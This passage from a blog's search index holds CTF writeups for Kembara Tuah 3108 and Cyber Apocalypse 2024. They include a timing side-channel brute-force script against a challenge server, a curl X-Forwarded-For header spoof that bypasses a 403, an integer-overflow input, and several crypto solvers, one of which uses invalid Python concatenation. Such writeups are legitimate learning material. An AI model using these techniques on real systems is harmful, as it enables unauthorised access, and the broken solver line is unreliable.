in decoded_bytes) print(\u0026#34;Decoded flag:\u0026#34;, decoded_string) Berenang Ke Tepian # Berakit, berakitlah ke hulu Berenang, berenangku ke tepian Bersakit, biar kusakit dahulu Bersenang denganmu kemudian\nKelip-kelip kusangkakan api Sinar matahari membawa cahaya Kau hilang ghaib, sangkaku kaubenci Kiranya sengaja nak menduga\nFlag: 3108{s1mpl3_p3ngundur4n}\nWe are given an ELF executable and the NetCat connection to obtain the real flag. I uploaded the binary to DogBolt to decompile to understand the code and found something interesting. Which is the Sleep timer that is being applied given that the character is correct. If the character is wrong, then it will terminate without the Sleep timer being imposed. That means, we can exploit this functionality to brute-force the flag, this exploit is also known as Side Channel Attack (watch this video to understand side channel attack)\nNow knowing that I asked ChatGPT to help me create a script to perform the attack. I set the flag length to 100 because I\u0026rsquo;m not sure how long the flag was and I just did it the \u0026ldquo;dirty\u0026rdquo; way. The brute-force process took a long time, there should be better solution to this.\nimport socket import time import string def send_input_and_measure_time(input_string, remote_ip, remote_port): \u0026#34;\u0026#34;\u0026#34;Send input to the remote service and measure the time taken for a response.\u0026#34;\u0026#34;\u0026#34; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((remote_ip, remote_port)) s.sendall((input_string + \u0026#39;\\n\u0026#39;).encode()) start_time = time.perf_counter() response = receive_response(s) end_time = time.perf_counter() response_time = end_time - start_time finally: s.close() return response_time, response def receive_response(sock): \u0026#34;\u0026#34;\u0026#34;Receive the full response from the server.\u0026#34;\u0026#34;\u0026#34; response = b\u0026#39;\u0026#39; while True: chunk = sock.recv(4096) if not chunk: break response += chunk if b\u0026#39;\\n\u0026#39; in response: break return response.decode() def find_flag_character(position, current_flag, remote_ip, remote_port): \u0026#34;\u0026#34;\u0026#34;Determine the best character for the given position in the flag.\u0026#34;\u0026#34;\u0026#34; characters = string.ascii_letters + string.digits + string.punctuation best_char = \u0026#39;\u0026#39; max_time = 0 for char in characters: guess = current_flag + char response_time, _ = send_input_and_measure_time(guess, remote_ip, remote_port) if response_time \u0026gt; max_time: max_time = response_time best_char = char return best_char def recover_flag(remote_ip, remote_port, known_prefix): \u0026#34;\u0026#34;\u0026#34;Recover the full flag by guessing each character, starting from a known prefix.\u0026#34;\u0026#34;\u0026#34; flag = known_prefix flag_length = 100 # Initial guess for the length of the flag for i in range(len(known_prefix), flag_length): flag += find_flag_character(i, flag, remote_ip, remote_port) print(f\u0026#34;Flag so far: {flag}\u0026#34;) print(f\u0026#34;Recovered Flag: {flag}\u0026#34;) # Example usage remote_ip = \u0026#39;103.28.91.24\u0026#39; # Remote IP address remote_port = 10020 # Remote port known_prefix = \u0026#34;3108{\u0026#34; # Known initial part of the flag recover_flag(remote_ip, remote_port, known_prefix) The flag can be obtained after the brute-force process finished.\nIlmu Hisab # Mampukah tuan hamba mengira?\nFlag: 3108{n0mb0r_k3r4mat}\nWe are given an ELF file to reverse and NetCat connection to get the actual flag. Using DogBolt we can look at the decompiled code. At which we would put our attention to the function addtwonumber which will accept two values where v9 = first value v10 = second value\nNotice that the first highlighted If statement checks if the the value of v9 is less than MAX Numeric Limit - 83647.\nThen the second highlighted If statement checks If the value of v9 = 1337 AND v10 greater than 7331 AND the sum of both value needs to be less than 0. (Impossible) OR If the value of v9 less than 0 AND v10 less than 0 AND sum of both more than 0 (Impossible)\nThe If statement seems to be impossible to achieve merdeka function. But not with Integer Overflow. (Watch this video: Overflow in Signed and Unsigned Numbers)\nTo obtain merderka function. We can add v9 + v10 \u0026gt; 2147483647 which is the MAX Numeric Limit. Using the first condition where v9 = 1337 AND v10 greater than 7331 to perform the overflow. Since we know that v9 cannot be changed, we need to find v10. v10 = 2147483657 - 1336 = 2147482321\nWith that we can reach merdeka function which will reveal the flag.\nSarawak Kita # Ada pendapat yang menyatakan bahawa Kuching mendapat nama sempena sebatang sungai kecil, Sungai Kuching yang mengalir di antara Muzium Cina dan Kuil Tua Pek Kong. Sungai Kuching pula barangkali memperoleh nama daripada Kucing Hutan yang kerap mengunjunginya. Sungai tersebut juga berhampiran dengan sebuah bukit yang banyak ditumbuhi oleh pokok Buah Mata Kucing. Lantaran tersebut ianya diberi nama Bukit Mata Kucing. Tapi ini bukan tentang kisah Kuching, ini kisah bagaimana ingin mendapatkan \u0026lsquo;flag\u0026rsquo; di dalam document yang berbahaya.\nFlag: 3108{Kuch1ng_1bu_N3g3r1_S4r4w4k}\nWe are given a Word Document, using oleid it can be seen that the document contains VBA macros With that I used olevba to read the VBA code, and found a Base64 hash As always I will use the trusty CyberChef to decode the Base64 and obtained the flag. This article from Intezer explains in detail how to analyze Microsoft Office files.\nWeb # Selangorku # Hi semua saya @AnakSelangor86. Saya seorang Web Developer yang mempunyai semangat patriotik yang tinggi terhadap kemerdekaan terutamanya negeri selangor saya ada cipta satu website mengenai selangor dan hanya orang tertentu sahaja bole access ke website tersebut :)\nselamat mencubaa perwira!!!!\nFlag: 3108{S3lang0r_temp4t_kelahiran_ku}\nTrying to access the webpage will give us 403 Forbidden. I then go and search online for any possible solution and found this writeup Then I tried using Curl with X-Forwarderd-For header to local host.\ncurl -v \u0026lt;url\u0026gt; -H \u0026#39;X-Forwarded-For: 127.0.0.1\u0026#39; Which I am able to access the site and it shows a list of html files. I tried to access it using the above method and found the flag at the hulu_selangor.html I found this to be quite similar and very helpful resource Cyber Plumber Handbook, which teach about ways to navigate around the network using SSH and port redirection.\n","date":"2 September 2024","externalUrl":null,"permalink":"/posts/kembara3108/","section":"Posts","summary":"This is a CTF writeup for Kembara Tuah 3108 CTF.","title":"Kembara Tuah 3108 - Writeup","type":"posts"},{"content":" Crypto # Dynastic # You find yourself trapped inside a sealed gas chamber, and suddenly, the air is pierced by the sound of a distorted voice played through a pre-recorded tape. Through this eerie transmission, you discover that within the next 15 minutes, this very chamber will be inundated with lethal hydrogen cyanide. As the tapeâ€™s message concludes, a sudden mechanical whirring fills the chamber, followed by the ominous ticking of a clock. You realise that each beat is one step closer to death. Darkness envelops you, your right hand restrained by handcuffs, and the exit door is locked. Your situation deteriorates as you realise that both the door and the handcuffs demand the same passcode to unlock. Panic is a luxury you cannot afford; swift action is imperative. As you explore your surroundings, your trembling fingers encounter a torch. Instantly, upon flipping the switch, the chamber is bathed in a dim glow, unveiling cryptic letters etched into the walls and a disturbing image of a Roman emperor drawn in blood. Decrypting the letters will provide you the key required to unlock the locks. Use the torch wisely as its battery is almost drained out!\nFlag: HTB{DID_YOU_KNOW_ABOUT_THE_TRITHEMIUS_CIPHER?!_IT_IS_SIMILAR_TO_CAESAR_CIPHER}\nFor this challenge, there are 2 files. The output file and also the source code. Output.txt\nMake sure you wrap the decrypted text with the HTB flag format :-] DJF_CTA_SWYH_NPDKK_MBZ_QPHTIGPMZY_KRZSQE?!_ZL_CN_PGLIMCU_YU_KJODME_RYGZXL Source.py\nfrom secret import FLAG from random import randint def to_identity_map(a): return ord(a) - 0x41 def from_identity_map(a): return chr(a % 26 + 0x41) def encrypt(m): c = \u0026#39;\u0026#39; for i in range(len(m)): ch = m[i] if not ch.isalpha(): ech = ch else: chi = to_identity_map(ch) ech = from_identity_map(chi + i) c += ech return c with open(\u0026#39;output.txt\u0026#39;, \u0026#39;w\u0026#39;) as f: f.write(\u0026#39;Make sure you wrap the decrypted text with the HTB flag format :-]\\n\u0026#39;) f.write(encrypt(FLAG)) This is a simple algorithm to encrypt the data. Here\u0026rsquo;s how it works:\nIt will iterate through all of the data one by one. Check if the character is alphabet letters, True: Minus the hex value of that ASCII character with 0x41, and then get the value of modulo 26 of the minus value and add 0x41 to it. After that, add the value with the current number of iteration. Then append the value into a variable X. False: Append that value into a variable X. Append the value from above into the variable Crypt. Return the value Crypt. The solution is very simple, just by reversing the steps used to encrypt the flag and the flag can be obtained. Solution.py\n#from secret import FLAG #from random import randint def to_identity_map(a): return ord(a) - 0x41 def from_identity_map(a): return chr(a % 26 + 0x41) def encrypt(m): c = \u0026#39;\u0026#39; for i in range(len(m)): ch = m[i] if not ch.isalpha(): # If not a character ech = ch else: #If it\u0026#39;s a character chi = to_identity_map(ch) ech = from_identity_map(chi + i) c += ech return c def decrypt(flag): unencrypted_text = \u0026#39;\u0026#39; for i in range(len(flag)): char = flag[i] if not char.isalpha(): dchar = char else: ichar = to_identity_map(char) dchar = from_identity_map(ichar - i) unencrypted_text += dchar return unencrypted_text #with open(\u0026#39;output.txt\u0026#39;, \u0026#39;w\u0026#39;) as f: # f.write(\u0026#39;Make sure you wrap the decrypted text with the HTB flag #format :-]\\n\u0026#39;) # f.write(encrypt(FLAG)) flag = \u0026#34;DJF_CTA_SWYH_NPDKK_MBZ_QPHTIGPMZY_KRZSQE?!_ZL_CN_PGLIMCU_YU_KJODME_RYGZXL\u0026#34; print(\u0026#34;HTB{\u0026#34;.decrypt(flag).\u0026#34;}\u0026#34;) Iced Tea # Locked within a cabin crafted entirely from ice, you\u0026rsquo;re enveloped in a chilling silence. Your eyes land upon an old notebook, its pages adorned with thousands of cryptic mathematical symbols. Tasked with deciphering these enigmatic glyphs to secure your escape, you set to work, your fingers tracing each intricate curve and line with determination. As you delve deeper into the mysterious symbols, you notice that patterns appear in several pages and a glimmer of hope begins to emerge. Time is flying and the temperature is dropping, will you make it before you become one with the cabin?\nFlag: HTB{th1s_1s_th3_t1ny_3ncryp710n_4lg0r1thm_y0u_m1ght_h4v3_4lr34dy_s7umbl3d_up0n_1t_1f_y0u_d0_r3v3rs1ng}\nGiven 2 file, one output and one source as shown below. Output.txt\nKey : 850c1413787c389e0b34437a6828a1b2 Ciphertext : b36c62d96d9daaa90634242e1e6c76556d020de35f7a3b248ed71351cc3f3da97d4d8fd0ebc5c06a655eb57f2b250dcb2b39c8b2000297f635ce4a44110ec66596c50624d6ab582b2fd92228a21ad9eece4729e589aba644393f57736a0b870308ff00d778214f238056b8cf5721a843 Source.py\nimport os from secret import FLAG from Crypto.Util.Padding import pad from Crypto.Util.number import bytes_to_long as b2l, long_to_bytes as l2b from enum import Enum class Mode(Enum): ECB = 0x01 CBC = 0x02 class Cipher: def __init__(self, key, iv=None): self.BLOCK_SIZE = 64 self.KEY = [b2l(key[i:i+self.BLOCK_SIZE//16]) for i in range(0, len(key), self.BLOCK_SIZE//16)] self.DELTA = 0x9e3779b9 self.IV = iv if self.IV: self.mode = Mode.CBC else: self.mode = Mode.ECB def _xor(self, a, b): return b\u0026#39;\u0026#39;.join(bytes([_a ^ _b]) for _a, _b in zip(a, b)) def encrypt(self, msg): msg = pad(msg, self.BLOCK_SIZE//8) blocks = [msg[i:i+self.BLOCK_SIZE//8] for i in range(0, len(msg), self.BLOCK_SIZE//8)] ct = b\u0026#39;\u0026#39; if self.mode == Mode.ECB: for pt in blocks: ct += self.encrypt_block(pt) elif self.mode == Mode.CBC: X = self.IV for pt in blocks: enc_block = self.encrypt_block(self._xor(X, pt)) ct += enc_block X = enc_block return ct def encrypt_block(self, msg): m0 = b2l(msg[:4]) m1 = b2l(msg[4:]) K = self.KEY msk = (1 \u0026lt;\u0026lt; (self.BLOCK_SIZE//2)) - 1 s = 0 for i in range(32): s += self.DELTA m0 += ((m1 \u0026lt;\u0026lt; 4) + K[0]) ^ (m1 + s) ^ ((m1 \u0026gt;\u0026gt; 5) + K[1]) m0 \u0026amp;= msk m1 += ((m0 \u0026lt;\u0026lt; 4) + K[2]) ^ (m0 + s) ^ ((m0 \u0026gt;\u0026gt; 5) + K[3]) m1 \u0026amp;= msk m = ((m0 \u0026lt;\u0026lt; (self.BLOCK_SIZE//2)) + m1) \u0026amp; ((1 \u0026lt;\u0026lt; self.BLOCK_SIZE) - 1) # m = m0 || m1 return l2b(m) if __name__ == \u0026#39;__main__\u0026#39;: KEY = os.urandom(16) cipher = Cipher(KEY) ct = cipher.encrypt(FLAG) with open(\u0026#39;output.txt\u0026#39;, \u0026#39;w\u0026#39;) as f: f.write(f\u0026#39;Key : {KEY.hex()}\\nCiphertext : {ct.hex()}\u0026#39;) By the name of the challenge, I begin with searching \u0026ldquo;Iced Tea encryption\u0026rdquo; on Google and I found out a Wiki page explaining the eXtended Tiny Encryption Algorithm. The cipher code was similar to the one provided I used ChatGPT to help me understand the code and come with the following script to decrypt the flag.\nfrom Crypto.Util.Padding import unpad from Crypto.Util.number import bytes_to_long as b2l, long_to_bytes as l2b from enum import Enum import os class Mode(Enum): ECB = 0x01 CBC = 0x02 class Cipher: def __init__(self, key, iv=None): self.BLOCK_SIZE = 64 self.KEY = [b2l(key[i:i+self.BLOCK_SIZE//16]) for i in range(0, len(key), self.BLOCK_SIZE//16)] self.DELTA = 0x9e3779b9 self.IV = iv if self.IV: self.mode = Mode.CBC else: self.mode = Mode.ECB def _xor(self, a, b): return b\u0026#39;\u0026#39;.join(bytes([_a ^ _b]) for _a, _b in zip(a, b)) def decrypt(self, ct): blocks = [ct[i:i+self.BLOCK_SIZE//8] for i in range(0, len(ct), self.BLOCK_SIZE//8)] pt = b\u0026#39;\u0026#39; if self.mode == Mode.ECB: for ct_block in blocks: pt += self.decrypt_block(ct_block) elif self.mode == Mode.CBC: X = self.IV for ct_block in blocks: pt_block = self._xor(X, self.decrypt_block(ct_block)) pt += pt_block X = ct_block return pt def decrypt_block(self, ct): c = b2l(ct) m0 = c \u0026gt;\u0026gt; (self.BLOCK_SIZE//2) m1 = c \u0026amp; ((1 \u0026lt;\u0026lt; (self.BLOCK_SIZE//2)) - 1) K = self.KEY msk = (1 \u0026lt;\u0026lt; (self.BLOCK_SIZE//2)) - 1 s = self.DELTA \u0026lt;\u0026lt; 5 for i in range(32): m1 -= ((m0 \u0026lt;\u0026lt; 4) + K[2]) ^ (m0 + s) ^ ((m0 \u0026gt;\u0026gt; 5) + K[3]) m1 \u0026amp;= msk m0 -= ((m1 \u0026lt;\u0026lt; 4) + K[0]) ^ (m1 + s) ^ ((m1 \u0026gt;\u0026gt; 5) + K[1]) m0 \u0026amp;= msk s -= self.DELTA m = ((m0 \u0026lt;\u0026lt; (self.BLOCK_SIZE//2)) + m1) \u0026amp; ((1 \u0026lt;\u0026lt; self.BLOCK_SIZE) - 1) # m = m0 || m1 return l2b(m) # Parse Key and Ciphertext from file with open(\u0026#39;output.txt\u0026#39;, \u0026#39;r\u0026#39;) as f: lines = f.readlines() KEY = bytes.fromhex(lines[0].split(\u0026#34;:\u0026#34;)[1].strip()) ct_hex = lines[1].split(\u0026#34;:\u0026#34;)[1].strip() # Initialize Cipher object with Key cipher = Cipher(KEY) # Decrypt Ciphertext ct = bytes.fromhex(ct_hex) pt = cipher.decrypt(ct) # Remove Padding pt = unpad(pt, cipher.BLOCK_SIZE//8) print(\u0026#34;Decrypted plaintext:\u0026#34;, pt.decode()) Makeshift # Weak and starved, you struggle to plod on. Food is a commodity at this stage, but you canâ€™t lose your alertness - to do so would spell death. You realise that to survive you will need a weapon, both to kill and to hunt, but the field is bare of stones. As you drop your body to the floor, something sharp sticks out of the undergrowth and into your thigh. As you grab a hold and pull it out, you realise itâ€™s a long stick; not the finest of weapons, but once sharpened could be the difference between dying of hunger and dying with honour in combat.\nFlag: HTB{4_b3tTeR_w3apOn_i5_n3edeD!?!}\nFor this challenge we are given an output file and a source file as below. Output.txt\n!?}De!e3d_5n_nipaOw_3eTR3bt4{_THB Source.py\nfrom secret import FLAG flag = FLAG[::-1] new_flag = \u0026#39;\u0026#39; for i in range(0, len(flag), 3): new_flag += flag[i+1] new_flag += flag[i+2] new_flag += flag[i] print(new_flag) It is a simple algorithm which works as follow:\nInverse the value of the flag. Create a variable called new_flag. In a for loop, iterate every 3 step until it reached the end of the value of the flag and append the value in the order of 2nd, 3rd, and 1st position. (Let\u0026rsquo;s say there\u0026rsquo;s a string of \u0026ldquo;ABC\u0026rdquo; the algorithm will append the string in such order \u0026ldquo;BCA\u0026rdquo;). Pos Original Value Value After 1 A B 2 B C 3 C A After knowing that, I started writing the script to reverse the algorithm, which is by appending the value of the given string in the order of 3rd, 1st, and 2nd position to obtain the value and inverse it to obtain the original flag.\nnew_flag = \u0026#34;!?}De!e3d_5n_nipaOw_3eTR3bt4{_THB\u0026#34; old_flag = \u0026#34;\u0026#34; for i in range (0,len(new_flag),3): old_flag += new_flag[i+2] old_flag += new_flag[i] old_flag += new_flag[i+1] print(old_flag[::-1]) Primary Knowledge # Surrounded by an untamed forest and the serene waters of the Primus river, your sole objective is surviving for 24 hours. Yet, survival is far from guaranteed as the area is full of Rattlesnakes, Spiders and Alligators and the weather fluctuates unpredictably, shifting from scorching heat to torrential downpours with each passing hour. Threat is compounded by the existence of a virtual circle which shrinks every minute that passes. Anything caught beyond its bounds, is consumed by flames, leaving only ashes in its wake. As the time sleeps away, you need to prioritise your actions secure your surviving tools. Every decision becomes a matter of life and death. Will you focus on securing a shelter to sleep, protect yourself against the dangers of the wilderness, or seek out means of navigating the Primusâ€™ waters?\nFlag: HTB{0h_d4mn_4ny7h1ng_r41s3d_t0_0_1s_1!!!}\nWe are given 2 file, one output.txt and one source.py as follow: Output.txt\nn = 144595784022187052238125262458232959109987136704231245881870735843030914418780422519197073054193003090872912033596512666042758783502695953159051463566278382720140120749528617388336646147072604310690631290350467553484062369903150007357049541933018919332888376075574412714397536728967816658337874664379646535347 e = 65537 c = 15114190905253542247495696649766224943647565245575793033722173362381895081574269185793855569028304967185492350704248662115269163914175084627211079781200695659317523835901228170250632843476020488370822347715086086989906717932813405479321939826364601353394090531331666739056025477042690259429336665430591623215 Source.py\nimport math from Crypto.Util.number import getPrime, bytes_to_long from secret import FLAG m = bytes_to_long(FLAG) n = math.prod([getPrime(1024) for _ in range(2**0)]) e = 0x10001 c = pow(m, e, n) with open(\u0026#39;output.txt\u0026#39;, \u0026#39;w\u0026#39;) as f: f.write(f\u0026#39;{n = }\\n\u0026#39;) f.write(f\u0026#39;{e = }\\n\u0026#39;) f.write(f\u0026#39;{c = }\\n\u0026#39;) I noticed that the source code reassemble RSA encryption algorithm. The output provided the value of n, e and c. The value of n seems to be single value of prime number with the for loop (multiplied to 0). Hence I wrote the code to decrypt the value of the flag as below.\nSolution.py\nfrom Crypto.Util.number import inverse, long_to_bytes n = 144595784022187052238125262458232959109987136704231245881870735843030914418780422519197073054193003090872912033596512666042758783502695953159051463566278382720140120749528617388336646147072604310690631290350467553484062369903150007357049541933018919332888376075574412714397536728967816658337874664379646535347 e = 65537 c = 15114190905253542247495696649766224943647565245575793033722173362381895081574269185793855569028304967185492350704248662115269163914175084627211079781200695659317523835901228170250632843476020488370822347715086086989906717932813405479321939826364601353394090531331666739056025477042690259429336665430591623215 # Calculate the modular inverse of e modulo (p-1)(q-1) # Assuming n is the product of two large primes p and q # Since we don\u0026#39;t know p and q, we can\u0026#39;t directly calculate phi(n), so we\u0026#39;ll use the alternative approach d = inverse(e, (n - 1)) # Decrypt the ciphertext m = pow(c, d, n) print(\u0026#34;Decrypted message (m):\u0026#34;, long_to_bytes(m)) Forensic # Urgent # In the midst of Cybercity\u0026rsquo;s \u0026ldquo;Fray,\u0026rdquo; a phishing attack targets its factions, sparking chaos. As they decode the email, cyber sleuths race to trace its source, under a tight deadline. Their mission: unmask the attacker and restore order to the city. In the neon-lit streets, the battle for cyber justice unfolds, determining the factions\u0026rsquo; destiny.\nFlag: HTB{4n0th3r_d4y_4n0th3r_ph1shi1ng_4tt3mpT}\nThe files given for this challenge was a file Electric Mail Format file extension. I then search for more information about this file extension and I came across emlAnalyzer tool to view the content of the EML file and also extracting data from it.\nAfter installing the tool, I started reading the help guide and learn how to use the tool. I first started analyze the file and found out that there\u0026rsquo;s a HTML attachment. Upon further reading on the help guide, the emlAnlayzer can also extract the attachment from the EML file. So I proceed to extract the HTML file out. I then open the extracted HTML file in the browser but it shows 404 Not Found. I then proceed to view the source of the HTML file itself and found something. It is an encoded JavaScript code. Since the code was not heavily obfuscated I can easily decode the encoded script. I just use the console of the browser and use the console.log() and unescape() function to obtain the flag. I also noticed that the flag can be obtained via the Inspect Element tool of the browser. Other than that, I also found out that the EML file is an ASCII text file and I output the content of the file and got a Base64 encoded data of the attachment. I proceed to use CyberChef to decode the Base64 data, and I obtained the same value as when I view the page source of the HTML file. Phreaky # In the shadowed realm where the Phreaks hold sway, A mole lurks within, leading them astray. Sending keys to the Talents, so sly and so slick, A network packet capture must reveal the trick. Through data and bytes, the sleuth seeks the sign, Decrypting messages, crossing the line. The traitor unveiled, with nowhere to hide, Betrayal confirmed, they\u0026rsquo;d no longer abide.\nFlag: HTB{Th3Phr3aksReadyT0Att4ck}\nThe file given is a PCAP file, hence I opened it using WireShark to analyze it. First I open up the Capture File Properties to identify what am I dealing with. I then dig into the Protocol Hierarchy Statistics and found out that most of there\u0026rsquo;s a huge portion in Internet Message Format and HTTP. So I then applied the filter to filter the IMF protocol first. I found out that there\u0026rsquo;s plain text data of the password and also filename, and I noticed that the file type is in ZIP format. I then search online on how to extract file from WireShark and found this video on YouTube which guide on how to export the data from WireShark. I also note down all of the filename and password for the extraction of data later. I then proceed to export the file from WireShark and noticed that the content type of the exports are EML. I proceed to use the emlAnalyzer to extract the ZIP file from the all of the exported EML file from WireShark earlier. Here\u0026rsquo;s where the filename and password from earlier comes in handy. I just pasted the password to extract the file for each of the ZIP file extracted and I got these PDF fragments. So, I just use a simple command to combine all these PDF fragments into one combined PDF file. After that, I open up the combined pdf and found the flag. Hardware # Maze # In a world divided by factions, \u0026ldquo;AM,\u0026rdquo; a young hacker from the Phreaks, found himself falling in love with \u0026ldquo;echo,\u0026rdquo; a talented security researcher from the Revivalists. Despite the different backgrounds, you share a common goal: dismantling The Fray. You still remember the first interaction where you both independently hacked into The Fray\u0026rsquo;s systems and stumbled upon the same vulnerability in a printer. Leaving behind your hacker handles, \u0026ldquo;AM\u0026rdquo; and \u0026ldquo;echo,\u0026rdquo; you connected through IRC channels and began plotting your rebellion together. Now, it\u0026rsquo;s finally time to analyze the printer\u0026rsquo;s filesystem. What can you find?\nFlag: HTB{1n7323571n9_57uff_1n51d3_4_p21n732}\nGiven the file system to the printer. I first list out the directories of the file system to see what folders do I have. The saveDevice seems to be interesting folder and might hold some data used by the to printer documents. Hence, I started digging into the the directory. I came across this PDF file while digging through the file system and I opened it with a PDF viewer and managed to find the flag in the PDF. ![[Pasted image 20240310035535.png]]\nMisc # Stop Drop and Roll # The Fray: The Video Game is one of the greatest hits of the last\u0026hellip; well, we don\u0026rsquo;t remember quite how long. Our \u0026ldquo;computers\u0026rdquo; these days can\u0026rsquo;t run much more than that, and it has a tendency to get repetitive\u0026hellip;\nFlag: HTB{1_wiLl_sT0p_dR0p_4nD_r0Ll_mY_w4Y_oUt!}\nGiven a docker instance, I used netcat to access the docker instance and I am greeted with the prompt below. I started to type in the response with the instruction given above, however I do feel like this is going to be tough by manually inputting the response. As the description of the challenge mentioned that the program would be repetitive. Therefore, my first thought would be creating a script to automate the response.\nimport socket import time def play_game(): with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: s.connect((\u0026#39;83.136.254.167\u0026#39;, 31113)) # Connect to the game server # Start the game data = s.recv(1024).decode() # Receive initial message print(data) # Print the initial message # Confirm readiness s.sendall(b\u0026#39;y\\n\u0026#39;) # Send \u0026#39;y\u0026#39; to confirm readiness time.sleep(1) # Delay before starting the confirmation # Repeat the response process until no data received. while True: data = s.recv(1024).decode() # Receive game scenario if not data: # If no data received, break the loop break print(data) # Print the game scenario scenarios = data.strip().split(\u0026#39;, \u0026#39;) # Split the scenario into individual elements print(\u0026#34;Scenarios:\u0026#34;,scenarios) response = \u0026#34;\u0026#34; # Initialize response string for scenario in scenarios: if \u0026#34;FIRE\u0026#34; in scenario: response += \u0026#34;ROLL-\u0026#34; # If scenario contains FIRE, append ROLL to response elif \u0026#34;GORGE\u0026#34; in scenario: response += \u0026#34;STOP-\u0026#34; # If scenario contains GORGE, append STOP to response elif \u0026#34;PHREAK\u0026#34; in scenario: response += \u0026#34;DROP-\u0026#34; # If scenario is PHREAK, append DROP to response response = response[:-1] # Remove the last \u0026#39;-\u0026#39; from the response print(\u0026#34;Response:\u0026#34;, response) # Print the response s.sendall(response.encode() + b\u0026#39;\\n\u0026#39;) # Send the response to the server time.sleep(1) # Delay for 1 second if __name__ == \u0026#34;__main__\u0026#34;: play_game() # Call the play_game function to start the game After few minutes of running the script I got the flag. Rev # Lootstash # A giant stash of powerful weapons and gear have been dropped into the arena - but there\u0026rsquo;s one item you have in mind. Can you filter through the stack to get to the one thing you really need?\nFlag: HTB{n33dl3_1n_a_l00t_stack}\nThe file given is an ELF file, and the description of the challenge mentioned about filter through the stack. So what I did was using strings to get the string value of the file and use grep to filter the keyword of the flag which is HTB and that is how I obtained the flag. ","date":"13 March 2024","externalUrl":null,"permalink":"/posts/cyberapocalpyse2024/","section":"Posts","summary":"This is a CTF writeup for Cyber Apocalypse 2024.","title":"Cyber Apocalypse 2024 - Writeup","type":"posts"},{"content":" About Me # Hi, I\u0026rsquo;m oxygen â€” a Blue Teamer with a passion for DFIR and Malware Analysis. I\u0026rsquo;m driven by curiosity and a desire to protect systems from evolving threats. Whether itâ€™s investigating incidents, analyzing malware, or fortifying defenses, I love solving complex puzzles and uncovering the truth behind cyberattacks.\nI\u0026rsquo;m a lifelong learner, always eager to expand my knowledge and sharpen my skills. While I\u0026rsquo;m still growing in the field of DFIR, I embrace every opportunity to learn and improve.\nFind me here # Twitter (X)\nDiscord - oxygen28\n","externalUrl":null,"permalink":"/about/","section":"","summary":"About Me # Hi, I\u0026rsquo;m oxygen â€” a Blue Teamer with a passion for DFIR and Malware Analysis.","title":"","type":"page"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]